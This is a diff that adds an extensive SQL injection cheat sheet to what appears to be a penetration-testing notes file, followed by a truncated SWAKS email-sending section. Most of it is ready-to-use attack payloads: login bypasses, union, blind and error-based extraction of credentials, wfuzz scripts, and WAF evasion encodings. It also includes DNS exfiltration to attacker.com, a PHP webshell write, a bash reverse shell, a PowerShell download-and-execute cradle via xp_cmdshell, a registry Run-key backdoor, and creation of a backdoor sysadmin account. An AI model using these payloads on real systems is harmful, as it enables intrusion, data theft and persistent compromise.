@@ -4039,3 +4039,450 @@ or
 >    die();
 > }
 > ```
+
+---
+
+## SQL Injection
+
+## Basic Commands
+
+- ### MYSQL
+
+| Command                                 | Description                                               |
+|-----------------------------------------|-----------------------------------------------------------|
+| `LIMIT <row offset>, <number of rows>`  | Display rows based on offset and number                   |
+| `COUNT(*)`                              | Display number of rows                                    |
+| `RAND()`                                | Generate random number between 0 and 1                    |
+| `FLOOR(RAND()*<number>)`                | Print out number part of random decimal number            |
+| `SELECT (SELECT DATABASE());`           | Double query (nested) using DATABASE() as an example      |
+| `GROUP BY <column name>`                | Summarize rows based on column name                       |
+| `CONCAT(<string1>, <string2>, ...)`     | Concatenate strings such as tables, column names          |
+| `LENGTH(<string>)`                       | Calculate the number of characters for a given string     |
+| `SUBSTR(<string>, <offset>, <length>)`   | Print string character(s) by providing offset and length |
+| `ASCII(<character>)`                    | Decimal representation of the character                   |
+| `SLEEP(<number of seconds>)`            | Go to sleep for <number of seconds>                       |
+| `IF(<condition>, <true action>, <false action>)` | Conditional if statement                     |
+| `LIKE "<string>%"`                      | Checks if provided string is present                      |
+| `OUTFILE "<url to file>"`               | Dump output of select statement into a file               |
+| `LOAD_FILE("<url to file>")`            | Dump the content of a file                                |
+
+- ### MSSQL
+
+| Command | Description |
+|---|---|
+| `SELECT TOP <number> * FROM <table>` | Equivalent of `LIMIT` for MSSQL |
+| `COUNT(*) AS Total` | Display number of rows |
+| `NEWID()` | Generate random unique identifier |
+| `CAST(<expression> AS <data_type>)` | Cast expression to a specific data type |
+| `SELECT DB_NAME()` | Get the current database name |
+| `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>'` | Get column names |
+
+**Manual Detection**
+
+- ### Quote Tests
+Tests for SQL parsing errors by injecting different types of quotes:
+
+### Quote tests - Testing for SQL parsing errors
+| Input | Description |
+|---|---|
+| `username'` | Single quote – Most common SQL injection test |
+| `username"` | Double quote – Used in some database types |
+| `username\`` | Backtick – Mainly for MySQL identifier injection |
+
+- ### Logic Tests
+Verifies query manipulation possibilities through boolean logic:
+| Input | Description |
+|---|---|
+| `username' OR '1'='1` | Always true condition, often bypasses authentication |
+| `username' AND '1'='2` | Always false condition, verifies boolean responses |
+| `username' WAITFOR DELAY '0:0:5'--` | Time-based test, checks for blind injection |
+
+- ### Error Tests
+Forces database errors to gather information about the backend:
+| Input | Description |
+|---|---|
+| `username' AND 1=convert(int,@@version)--` | Forces type conversion error, reveals MSSQL version |
+| `username' AND 1=cast((SELECT @@version) as int)--` | Alternative version check for MSSQL |
+
+**Scanning**
+
+- ### Using Nuclei templates
+> ```bash
+> nuclei -u "http://target.com" -t sqli/ -severity critical
+> # Scans target using Nuclei's SQL injection templates
+> # -severity critical: Only runs critical severity checks
+> ```
+
+## Error Based
+- ### Simple authentication bypass
+> ```sql
+> <input>' OR 1=1 -- //
+> ```
+- ### Get the version
+> ``` sql
+> <input>' OR 1=1 in (SELECT @@version) -- //
+> ```
+
+- ### Dump all data:
+> ```sql
+> <input>' OR 1=1 in (SELECT * FROM <table>) -- //
+> # Example
+> <input>' OR 1=1 in (SELECT * FROM users) -- //
+> ```
+- ### Dump specific data:
+> ```sql
+> <input>' OR 1=1 in (SELECT <column> FROM <table> WHERE <condition>) -- //
+> # Example
+> ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+> ```
+
+- ### MySQL error-based extraction
+### Uses GROUP BY and RAND() to force a duplicate key error containing our data
+> ```sql
+> AND (SELECT 6062 FROM(
+>     SELECT COUNT(*),
+>     CONCAT(0x716b627071,     # Prefix hex marker
+>         (SELECT version()),   # Data we want to extract
+>         0x7178707871,        # Suffix hex marker
+>         FLOOR(RAND(0)*2))x   # Forces the error
+>     FROM INFORMATION_SCHEMA.PLUGINS 
+>     GROUP BY x)a)
+> ```
+
+- ### Similar technique but extracting database name
+> ```sql
+> AND (SELECT 2067 FROM (
+>     SELECT COUNT(*),
+>     CONCAT(0x716b627071,
+>         (SELECT database()),  # Extracts current database name
+>         0x7178707871,
+>         FLOOR(RAND(0)*2))x 
+>     FROM INFORMATION_SCHEMA.PLUGINS 
+>     GROUP BY x)a)
+> ```
+
+- #### MSSQL Time-based data extraction
+ ### Uses IF statement with WAITFOR to check conditions
+> ```sql
+> '; IF (SELECT system_user) = 'sa' WAITFOR DELAY '0:0:5'--
+> # Delays response by 5 seconds if current user is 'sa'
+> 
+> ';IF (SELECT COUNT(name) FROM sysobjects WHERE name = 'sometable')>0 WAITFOR DELAY '0:0:5'--
+> # Delays response if table 'sometable' exists
+> ```
+
+## Union Based
+
+| MySQL Code | MSSQL Code | Description |
+|------------|------------|-------------|
+| `<input>' ORDER BY <number> -- -` | `<input>' ORDER BY <number> -- -` | Check Column Count: for both MySQL and MSSQL, determine the number of columns the SELECT query expects. |
+| `http://<site>/report.php?id=-23' UNION SELECT 1, 2, DATABASE(), 4, 5; -- -` | `http://<site>/report.php?id=-23' UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -` | Table Enumeration: list all the tables from the current database. |
+| `http://<site>/report.php?id=-23' UNION SELECT 1, 2, table_name, 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -` | `http://<site>/report.php?id=-23' UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -` | Table Enumeration: list all the tables from the current database. |
+| `http://<site>/report.php?id=-23' UNION SELECT 1, 2, column_name, 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -` | `http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -` | Column Enumeration: list all the columns in a specific table. |
+| `<input>' UNION SELECT NULL, <column_1>, <column_2>, <column_3> FROM information_schema.columns WHERE table_schema=DATABASE() -- -` | `%' UNION SELECT database(), user(), @@version, null, null -- -` | Retrieve Information From Other Databases |
+| `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -` | `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -` | Retrieve Information From Other Databases |
+| `http://<site>/report.php?id=-23' UNION SELECT 1, 2, CONCAT(column1, column2), 4, 5 FROM <tablename> LIMIT 0, 1; -- -` | `http://<site>/report.php?id=-23' UNION SELECT 1, 2, column1 + column2, 4, 5 FROM <tablename> -- -` | Retrieve Data from Columns: extract data from specific columns. |
+| `http://website.com/index.php?id=1 ORDER BY <number> -- -` | `http://website.com/index.php?id=1 ORDER BY <number> -- -` | Determine Number of Columns: find the correct number of columns. |
+| `http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -` | `http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -` | Identify Union Columns: identify which columns are injectable. |
+| `http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> INTO OUTFILE "<file_path>" -- +` | `http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> EXEC xp_cmdshell 'echo <data> > <filename>'` | Dump Table Content to FileSystem: write content from a table into a file. |
+| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@VERSION, 4, 5 -- -` | Print SQL Version: determine the database version. |
+| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, USER(), 4, 5 -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -` | Print User Running the Query: retrieve the user currently running the query. |
+| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, SERVERPROPERTY('InstanceName'), 4, 5 -- -` | Print Database Directory: identify the database directory location. |
+| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -` | Print Table Names: retrieve a list of table names. |
+| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -` | Print Column Names: retrieve a list of column names from a specific table. |
+| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(<column_name>), 4, 5 FROM <table_name>; -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(<column_name>, ','), 4, 5 FROM <table_name>; -- -` | Print Content of a Column: extract specific content from a column. |
+| `http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -` | `http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -` | Use AND Statement as Comment Alternative: when comments are blocked, use an AND statement. |
+
+- ### Column number enumeration - Finding number of columns in original query
+> ```sql
+> ' ORDER BY 1--  # Tests if 1 column exists
+> ' ORDER BY 2--  # Tests if 2 columns exist
+> # Continue incrementing until error occurs, revealing column count
+> ```
+
+- ### Alternative column enumeration using UNION
+> ```sql
+> ' UNION SELECT NULL--       # Tests for 1 column
+> ' UNION SELECT NULL,NULL--  # Tests for 2 columns
+> # NULL values are used because they can convert to any data type
+> ```
+
+- ### Data extraction after finding column count
+> ```sql
+> ' UNION SELECT username,password FROM users--  
+> # Direct extraction of user credentials when 2 columns are confirmed
+> 
+> ' UNION SELECT table_name,NULL FROM information_schema.tables--
+> # Lists all tables in database, NULL to match column count
+> 
+> ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+> # Lists all columns in users table
+> ```
+
+## Blind
+
+- ### Basic Check:
+> ```sql
+> http://<host>/vulnerable-page?param=<input>' OR '1'='1 --+
+> ```
+
+- ### Reflected Input Check: use these commands to determine if the input is being reflected in the output.
+> ```sql
+> http://<host>/vulnerable-page?param=<input>' AND 1=1 --+
+> http://<host>/vulnerable-page?param=<input>' AND '1'='1 --+
+> http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+
+> ```
+
+| MySQL Code | MSSQL Code | Description |
+|------------|------------|-------------|
+| `http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+` | `http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+` | **Extract Database Version**: Test for the database version using the `SUBSTRING` function. |
+| `http://<host>/vulnerable-page?param=<input>' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --+` | `http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a', WAITFOR DELAY '00:00:05', 0) --+` | **Extract Database Name**: Extract the database name using `SUBSTRING` and delay response for a true condition. |
+| `http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM information_schema.tables) > 5 --+` | `http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.tables) > 5 --+` | **Find Table Names**: Extract the first table name from the database. |
+| `http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 5 --+` | `http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.columns WHERE object_id = OBJECT_ID('users')) > 5 --+` | **Find Column Names in a Table**: Extract column names from a specific table. |
+| `http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --+` | `http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a' --+` | **Retrieve Specific Data**: Extract specific characters from the data using `SUBSTRING` or equivalent logic. |
+| `admin' AND SUBSTRING(username,1,1)='a' --+` | `admin' AND SUBSTRING(username,1,1)='a' --+` | **Character Enumeration in Database**: Use character enumeration to brute-force data extraction. |
+| `http://<host>/index.php?id=1' AND (SUBSTRING(database(), <offset>, <character_length>))='<character>' --+` | `http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, <character_length>))='<character>' --+` | **Determine Database Name**: Extract the database name using the `SUBSTRING` function. |
+| `admin' OR SLEEP(5);--+` | `admin' OR WAITFOR DELAY '00:00:05';--+` | **Login Panel Injection (MySQL & MSSQL)**: Test for time-based SQL injection by delaying the response. |
+| `http://<host>/login.php?user=admin' AND IF(1=1, SLEEP(5), 0) --+` | `http://<host>/login.php?user=admin' AND IIF(1=1, WAITFOR DELAY '00:00:05', 0) --+` | **Using Time-Based Conditions**: Use conditions to trigger delays, depending on the true/false evaluation of a statement. |
+| `http://<host>/index.php?id=1' AND SLEEP(10) --+` | `http://<host>/index.php?id=1' AND WAITFOR DELAY '00:00:10' --+` | **Confirm a Time-Based Blind SQL Injection**: Force the application to sleep if the query returns true. |
+| `http://<host>/index.php?id=1' AND IF((SELECT VERSION()) LIKE '5%', SLEEP(10), NULL) --+` | `http://<host>/index.php?id=1' AND IIF((SELECT @@VERSION) LIKE '5%', WAITFOR DELAY '00:00:10', NULL) --+` | **Determine Database Version**: Identify the database version by inducing a delay based on the condition. |
+
+- ### Determine Database Name with wfuzz: this command checks each character of the database name by comparing its ASCII value.
+#### Uses ASCII value extraction to determine each character of the database name
+> ```bash
+>   for i in $(seq 1 10); do 
+>   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
+> done > <filename.txt> && grep "0m9" <filename.txt
+> # Replace <filename.txt> with the name of the file to store results.
+> # Replace 10 in $(seq 1 10) with the estimated length of the database name.
+> # The FUZZ keyword is used by wfuzz to iterate through ASCII values.
+> ```
+
+- ### Determine Table Name with wfuzz: the query retrieves the ASCII value of each character in the first table name.
+#### Uses ASCII value extraction to determine each character of the first table name
+> ```bash
+>    for i in $(seq 1 10); do 
+>   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) > --+"; 
+> done > <filename.txt> && grep "0m9" <filename.txt
+> # Replace table_name and table_schema with the actual names if targeting specific databases or tables.
+> # Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.
+> ```
+
+- ### Determine Column Name with wfuzz: this command retrieves the column names from the targeted table using the information_schema.columns.
+#### Uses ASCII value extraction to determine each character of a column name
+> ```bash
+>    for i in $(seq 1 10); do 
+>   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), >NULL) --+"; 
+> done > <filename.txt> && grep "0m9" <filename.txt
+> # Replace <table_name> with the actual table name you are targeting.
+> # Adjust LIMIT 0,1 to retrieve column names for different tables.
+> ```
+
+- ### Extract Column Content with wfuzz: he query extracts content from a particular column by comparing ASCII values character by character.
+#### Extracts content from a specific column using ASCII value comparison
+> ```bash
+>   for i in $(seq 1 10); do 
+>  wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+"; 
+>done > <filename.txt> && grep "0m9" <filename.txt
+>
+># Replace <column_name> with the column you're trying to extract (e.g., username, password).
+># Replace <table_name> with the actual table name.
+># The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).
+> ```
+
+- ### Boolean based
+> ```sql
+> ' AND (SELECT 'x' FROM users WHERE username='admin' AND LENGTH(password)>5)='x'--
+> ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+> ```
+
+- ### Time based
+> ```sql
+> ' AND IF(LENGTH(database())>1,SLEEP(5),'false')--
+> ' WAITFOR DELAY '0:0:5'--
+> ' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE LENGTH(table_name)=6 AND table_schema=database())=1 AND SLEEP(5)--
+> ```
+
+**Out-of-Band**
+
+- ### DNS exfiltration (MySQL)
+> ```sql
+> ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\abc'))-- -
+> ```
+
+- ### HTTP request (MSSQL)
+> ```sql
+> '; exec master..xp_dirtree '//attacker.com/'; --
+> ```
+
+**Database Specific**
+
+- ### MYSQL
+| Category                     | MySQL Code                                                                 | Description                                      |
+|------------------------------|---------------------------------------------------------------------------|--------------------------------------------------|
+| **File operations**           | `SELECT LOAD_FILE('/etc/passwd');`                                          | Reads server files into query results           |
+|                              | `SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/shell.php';`  | Writes webshell to server                        |
+| **System information gathering** | `SELECT @@version;`                                                     | Database version                                |
+|                              | `SELECT @@datadir;`                                                       | Data directory location                         |
+|                              | `SELECT @@hostname;`                                                      | Server hostname                                 |
+|                              | `SELECT @@plugin_dir;`                                                    | Plugin directory location                       |
+|                              | `SELECT USER();`                                                           | Current database user                           |
+|                              | `SELECT CURRENT_USER();`                                                   | Current system user                             |
+| **User defined functions (UDF) for command execution** | `SELECT binary 0x[hex of udf library] INTO DUMPFILE '/usr/lib/mysql/plugin/evil.so';` | First create evil UDF library                   |
+|                              | `CREATE FUNCTION sys_exec RETURNS STRING SONAME 'evil.so';`                | Then create function                            |
+|                              | `SELECT sys_exec('whoami');`                                               | Execute command                                 |
+|                              | `SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1');`           | Execute command                                 |
+| **Privilege escalation**      | `SELECT grantee, privilege_type FROM information_schema.user_privileges;`  | List user privileges                            |
+|                              | `SELECT host, user, authentication_string FROM mysql.user;`               | List user credentials                           |
+
+- ### MSSQL
+| Category                        | SQL Code                                                                                                               | Description                                      |
+|----------------------------------|------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------|
+| **Command execution via xp_cmdshell** | `EXEC sp_configure 'show advanced options', 1;`                                                                          | Enable advanced options                         |
+|                                  | `RECONFIGURE;`                                                                                                          | Apply configuration changes                      |
+|                                  | `EXEC sp_configure 'xp_cmdshell', 1;`                                                                                   | Enable xp_cmdshell                               |
+|                                  | `RECONFIGURE;`                                                                                                          | Apply configuration changes                      |
+|                                  | `EXEC xp_cmdshell 'whoami';`                                                                                             | Execute command (`whoami`)                       |
+|                                  | `EXEC xp_cmdshell 'powershell IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/rev.ps1")';`            | Execute reverse shell using PowerShell          |
+| **File operations**             | `EXEC xp_dirtree '\\10.10.10.10\share';`                                                                                | Access SMB share                                 |
+|                                  | `BACKUP DATABASE master TO DISK = '\\10.10.10.10\share\backup.bak';`                                                    | Backup database to attacker's SMB share         |
+| **Registry operations**         | `EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName';`                   | Read registry value                             |
+|                                  | `EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','backdoor','REG_SZ','C:\backdoor.exe';` | Write registry value (backdoor)                  |
+| **Linked servers abuse**        | `SELECT * FROM OPENQUERY(remote_server, 'SELECT @@version');`                                                           | Query linked server for version                 |
+|                                  | `EXEC('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT linked_server;`                                          | Enable xp_cmdshell on linked server             |
+
+- ### PostgreSQL
+| Category                             | SQL Code                                                                                       | Description                                |
+|--------------------------------------|------------------------------------------------------------------------------------------------|--------------------------------------------|
+| **File operations**                  | `CREATE TABLE cmd_exec(cmd_output text);`                                                       | Create table for command output           |
+|                                      | `COPY cmd_exec FROM PROGRAM 'whoami';`                                                          | Execute command and store output          |
+|                                      | `SELECT * FROM cmd_exec;`                                                                       | Read command output                       |
+| **Large object operations**          | `SELECT lo_import('/etc/passwd', 12345);`                                                       | Import file as large object               |
+|                                      | `SELECT lo_get(12345);`                                                                         | Read large object                         |
+|                                      | `SELECT lo_export(12345, '/tmp/passwd');`                                                       | Export large object to file               |
+| **Command execution with extensions**| `CREATE EXTENSION IF NOT EXISTS dblink;`                                                        | Enable dblink                             |
+|                                      | `SELECT dblink_connect('host=10.10.10.10 user=postgres password=password');`                    | Connect to remote server                  |
+|                                      | `SELECT dblink_exec('DROP TABLE IF EXISTS cmd_exec');`                                          | Execute commands on remote server         |
+| **User defined functions**           | `CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;` | Create UDF for executing system commands  |
+|                                      | `SELECT system('whoami');`                                                                      | Execute system commands                    |
+
+- ### Oracle
+| Category                        | SQL Code                                                                                                               | Description                                    |
+|----------------------------------|------------------------------------------------------------------------------------------------------------------------|------------------------------------------------|
+| **File operations via Java**    | `BEGIN`<br>`  DBMS_JAVA.endsession;`<br>`  EXECUTE IMMEDIATE 'create or replace and resolve java source named "FileReader" as`<br>`  import java.io.*;`<br>`  public class FileReader {`<br>`    public static String readFile(String filename) throws Exception {`<br>`      BufferedReader br = new BufferedReader(new FileReader(filename));`<br>`      String output = "";`<br>`      String line;`<br>`      while((line=br.readLine())!=null) { output += line + "\n"; }`<br>`      return output;`<br>`    }`<br>`  }';`<br>`END;`<br>`/` | Creates and runs Java source for file reading in Oracle DB   |
+|                                  | `SELECT DBMS_JAVA.runjava('FileReader.readFile("/etc/passwd")') FROM dual;`                                            | Executes Java code to read `/etc/passwd` file  |
+| **Network operations**          | `SELECT UTL_HTTP.REQUEST('http://10.10.10.10/') FROM dual;`                                                           | Makes an HTTP request                         |
+|                                  | `SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual;`                                                      | DNS lookup                                    |
+|                                  | `SELECT UTL_TCP.AVAILABLE('10.10.10.10', 4444) FROM dual;`                                                            | Port scan (check if port is available)        |
+| **Command execution via Java**  | `BEGIN`<br>`  DBMS_JAVA.endsession;`<br>`  EXECUTE IMMEDIATE 'create or replace and resolve java source named "Shell" as`<br>`  public class Shell {`<br>`    public static String runCmd(String args) throws java.io.IOException {`<br>`      return new java.util.Scanner(Runtime.getRuntime().exec(args).getInputStream()).useDelimiter("\\A").next();`<br>`    }`<br>`  }';`<br>`END;`<br>`/` | Creates and runs Java code for command execution |
+|                                  | `SELECT DBMS_JAVA.runjava('Shell.runCmd("whoami")') FROM dual;`                                                        | Executes system command (`whoami`)             |
+| **Privilege escalation**        | `SELECT * FROM USER_ROLE_PRIVS;`                                                                                        | List current user privileges                  |
+|                                  | `SELECT * FROM DBA_ROLE_PRIVS;`                                                                                         | List all role privileges                      |
+|                                  | `SELECT * FROM ALL_TAB_PRIVS;`                                                                                          | List table privileges                         |
+
+**Post-Exploitation**
+| Category              | MySQL Code                                                                                       | MSSQL Code                                                                                     | Description                                         |
+|-----------------------|--------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------|-----------------------------------------------------|
+| **Enumerate Database Users** | `SELECT user,password FROM mysql.user;`                                                           | `SELECT name,password_hash FROM sys.sql_logins;`                                                  | Enumerates database users and their credentials.    |
+| **Find Sensitive Data**    | `SELECT * FROM information_schema.tables WHERE table_name LIKE '%credit%';`                       | `SELECT * FROM information_schema.tables WHERE table_name LIKE '%credit%';`                      | Finds tables related to sensitive data (e.g., credit). |
+|                       | `SELECT * FROM information_schema.columns WHERE column_name LIKE '%pass%';`                       | `SELECT * FROM information_schema.columns WHERE column_name LIKE '%pass%';`                      | Finds columns related to passwords.                 |
+| **Reading Sensitive Files** | `' UNION SELECT LOAD_FILE('/etc/passwd')-- -`                                                      | `' UNION SELECT * FROM OPENROWSET(BULK 'C:/windows/win.ini', SINGLE_CLOB) AS x-- -`              | Reads sensitive files (e.g., `/etc/passwd` on MySQL and `win.ini` on MSSQL). |
+| **Command Execution**      | `' UNION SELECT sys_exec('whoami')-- -`                                                            | `'; EXEC xp_cmdshell 'whoami'-- -`                                                               | Executes system commands (e.g., `whoami`).           |
+| **Establishing Persistence** | `' UNION SELECT 'EXEC sp_addlogin ''backdoor'', ''password123''; EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin'';'-- -` | N/A                                                                                                | Creates a backdoor admin user with elevated privileges. |
+
+**Bypass Techniques**
+| Category                    | SQL Code                                                                                                                | Description                                             |
+|-----------------------------|-------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------|
+| **Quote Bypass**             | `SELECT * FROM users WHERE username=0x61646D696E`                                                                       | Hex encoding to bypass quote filters (`'admin` in hex)  |
+|                             | `SELECT CONCAT('a','dmin')`                                                                                             | Concatenate to build strings without quotes             |
+|                             | `SELECT CHAR(65,68,77,73,78)`                                                                                           | Builds 'ADMIN' using ASCII values                       |
+| **Space Bypass**             | `SELECT/**/password/**/FROM/**/users/**/WHERE/**/id=1`                                                                   | Uses comments instead of spaces                         |
+|                             | `SELECT(password)FROM(users)WHERE(id=1)`                                                                                | Eliminates need for spaces using parentheses            |
+|                             | `SELECT%0Apassword%0AFROM%0Ausers`                                                                                       | Uses URL-encoded newlines                               |
+| **Filter Bypass**            | `SeLeCt * fRoM uSeRs`                                                                                                   | Bypasses case-sensitive filters                         |
+|                             | `SELECT -> [ALL, TOP 1]`                                                                                               | Alternative keyword for `SELECT`                        |
+|                             | `UNION -> [UNION ALL]`                                                                                                  | Alternative for `UNION`                                 |
+|                             | `SE%0ALECT`                                                                                                             | Uses keyword splitting                                  |
+| **Multi-Layer Encoding Bypass** | `UNION SELECT -> %55%4E%49%4F%4E%20%53%45%4C%45%43%54`                                                                  | Single URL encoding                                      |
+|                             | `UNION -> %2555%254E%2549%254F%254E`                                                                                     | Double URL encoding                                      |
+|                             | `SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054`                                                                         | Unicode encoding                                         |
+|                             | `UNION/*%0ASELECT*/`                                                                                                    | Combining comments and URL encoding                     |
+| **Logic Alternative Bypass** | `WHERE id=1 -> WHERE id=2-1`                                                                                            | Mathematical operation to bypass WAF logic              |
+|                             | `WHERE id=1 -> WHERE id=abs(1)`                                                                                         | Using `abs()` to bypass WAF                            |
+|                             | `WHERE id=1 -> WHERE id BETWEEN 1 AND 1`                                                                                | Boolean operation for bypassing                        |
+|                             | `WHERE name='admin' -> WHERE SUBSTR(name,1)='admin'`                                                                    | String operations for logic alternative                |
+| **Unicode Normalization Bypass** | `SELECT -> ＳＥＬＥＣＴ`                                                                                               | Fullwidth character substitution                      |
+|                             | `UNION -> ＵＮＩＯＮ`                                                                                                    | Unicode alternative characters                         |
+|                             | `SEＬEＣＴ`                                                                                                              | Mixed Unicode and normal characters                    |
+| **String Concatenation Bypass** | `'SEL'+'ECT' -> SELECT`                                                                                                 | Basic concatenation to avoid direct detection          |
+|                             | `CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))`                                                          | Using `CHAR` function to build `SELECT`                 |
+|                             | `CONCAT(0x53,0x45,0x4C,0x45,0x43,0x54)`                                                                                | Hex concatenation to build `SELECT`                    |
+
+## Login Bypass
+| Description                                      | SQL Code                                     |
+|--------------------------------------------------|----------------------------------------------|
+| **Standard OR-based bypass**                    | `' OR 1=1 --+`                               |
+| **Bypass with LIMIT (useful when multiple entries might be returned)** | `' OR 1=1 LIMIT 1 --+`                       |
+| **Bypass by using string comparison (common trick when numeric bypass fails)** | `' OR 'a'='a --+`                            |
+| **Using AND to combine conditions**             | `' OR 3=3 --+`                               |
+| **More obfuscated example (avoiding use of typical 1=1)** | `' OR 2=2 --+`                               |
+| **Bypass with string comparison (works for both MySQL and MSSQL)** | `' OR 'a'='a' --+`                           |
+| **OR-based bypass with a numeric comparison**   | `' OR 3=3 --+`                               |
+| **Bypass with LIMIT for MySQL (restricts to 1 entry)** | `' OR 1=1 LIMIT 1 --+`                       |
+| **MSSQL version of limiting output with TOP**    | `' OR 1=1; SELECT TOP 1 * FROM users --+`    |
+
+## Truncation
+
+### Truncation-based SQL injection occurs when the database limits user input based on a specified length, discarding any characters beyond that limit. This can be exploited by an attacker to manipulate user data. For example, an attacker can create a new user with a name like 'admin' and their own password, potentially causing multiple entries for the same username. If both entries are evaluated as 'admin', the attacker could gain unauthorized access to the legitimate admin account.
+
+### In the following example, the database truncates the username after a certain length (e.g., 10 characters). The attacker uses this to create a conflicting account:
+
+- ### Example of truncation; the database discards extra characters
+> ```text
+> username=admin++++++++(max.length)&password=testpwn123
+> 
+> -- Assume the database has a 10-character limit on the username field, note that more characters are added because otherwise the truncation won't be made.
+> username=admin++++++++&password=testpwn123
+> 
+> -- The database truncates the input to admin and discards the extra characters
+> -- If a user admin already exists, the attacker might be able to bypass authentication.
+> ```
+
+---
+
+## SWAKS
+
+> sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
+> --server [smtp-server-ip] --body [email-body.txt] \
+> --header "Subject: [email-subject]" --suppress-data
+>
+>     Purpose: this is a basic email with an attachment sent through an SMTP server.
+>
+>     Key parameters:
+>         -t: Recipient's email.
+>         --from: Sender's email.
+>         --attach: File to attach (e.g., a PDF or spreadsheet).
+>         --server: SMTP server to send the email.
+>         --body: Text file containing the email body.
+>         --header: Adds custom headers like "Subject".
+>         --suppress-data: Hides the email body in the output (for cleaner logs).
+>
+>
+> sudo swaks -t <recipient@example.com> --from <sender@example.com> \
